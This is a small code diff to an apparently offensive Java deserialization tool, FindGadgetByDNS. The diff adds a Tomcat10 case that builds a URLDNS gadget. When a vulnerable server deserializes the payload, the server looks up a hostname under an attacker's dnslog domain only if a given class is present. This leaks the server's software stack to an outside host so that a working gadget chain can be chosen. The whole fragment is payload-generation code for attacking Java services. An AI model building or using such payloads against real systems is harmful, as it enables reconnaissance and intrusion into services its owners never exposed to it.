@@ -240,6 +240,10 @@ public class FindGadgetByDNS implements ObjectPayload<Object> {
                 HashMap tomcat6 = getURLDNSgadget("http://Tomcat6."+dnslog, "org.apache.catalina.deploy.FilterDef");
                 list.add(tomcat6);
                 break;
+            case "Tomcat10":
+                HashMap tomcat10 = getURLDNSgadget("http://Tomcat10."+dnslog, "jakarta.servlet.http.HttpSession");
+                list.add(tomcat10);
+                break;
             case "Weblogic":
                 HashMap weblogic = getURLDNSgadget("http://Weblogic."+dnslog, "weblogic.common.ParamTypes");
                 list.add(weblogic);
